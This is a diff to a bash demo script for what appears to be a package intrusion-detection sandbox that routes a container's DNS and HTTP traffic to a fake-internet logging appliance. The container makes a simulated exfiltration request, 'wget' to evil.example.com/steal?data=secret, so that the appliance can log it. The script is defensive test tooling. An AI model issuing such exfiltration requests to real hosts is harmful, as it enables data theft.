@@ -11,6 +11,7 @@ set -euo pipefail
 DETONET="detonet"
 FAKEINTERNET_IP="10.200.200.2"
 LOGS_DIR="$(cd "$(dirname "$0")/.." && pwd)/logs/fakeinternet"
+DEMO_CONTAINER="pkgids-demo-capture"
 SEP="─────────────────────────────────────────────────────"
 
 echo ""
@@ -18,30 +19,44 @@ echo "$SEP"
 echo "  pkgids fake-internet demo"
 echo "$SEP"
 
-# ── 1. Run demo container: capture its own IP, then do DNS + HTTP ─────────────
+# Clean up any leftover container from a previous run
+docker rm -f "$DEMO_CONTAINER" 2>/dev/null || true
+
+# ── 1. Run demo container ─────────────────────────────────────────────────────
 echo ""
 echo "[1/3]  Running demo container on detonet ..."
 
-# The container prints its IP on the first line of stdout, then makes requests.
-# nslookup and wget output is redirected to /dev/null so only the IP line
-# reaches the shell variable.
-DEMO_IP=$(docker run --rm \
+# Run with a fixed --name so we can inspect its IP from the host afterward.
+# The container itself does NOT need to report its own IP.
+docker run --rm \
+  --name    "$DEMO_CONTAINER" \
   --network "$DETONET" \
   --dns     "$FAKEINTERNET_IP" \
   alpine sh -c '
-    # Print own IP (first line captured by the shell)
-    ip addr show eth0 \
-      | grep "inet " \
-      | awk "{print \$2}" \
-      | cut -d/ -f1
-
-    # DNS lookup — appliance logs query, resolves to itself
     nslookup evil.example.com >/dev/null 2>&1 || true
+    wget -q -O /dev/null "http://evil.example.com/steal?data=secret" 2>/dev/null || true
+  ' &
+DEMO_PID=$!
 
-    # HTTP request — appliance logs Host header + full request line
-    wget -q -O /dev/null \
-      "http://evil.example.com/steal?data=secret" 2>/dev/null || true
-  ')
+# While the container is running, read its IP from the host
+DEMO_IP=""
+for i in $(seq 1 20); do
+  DEMO_IP=$(docker inspect -f \
+    '{{.NetworkSettings.Networks.detonet.IPAddress}}' \
+    "$DEMO_CONTAINER" 2>/dev/null || true)
+  if [[ -n "$DEMO_IP" ]]; then
+    break
+  fi
+  sleep 0.2
+done
+
+# Wait for container to finish
+wait $DEMO_PID || true
+
+if [[ -z "$DEMO_IP" ]]; then
+  echo "  ERROR: could not determine demo container IP on detonet"
+  exit 1
+fi
 
 echo "    Container IP on detonet: $DEMO_IP"
 
@@ -58,7 +73,9 @@ if [[ -f "$LOG_FILE" ]]; then
   python3 -c "
 import json, sys
 for line in open('$LOG_FILE'):
-    print(json.dumps(json.loads(line.strip()), indent=2))
+    line = line.strip()
+    if line:
+        print(json.dumps(json.loads(line), indent=2))
 "
 else
   echo "  (log file not found — check that pkgids-fakeinternet is running)"
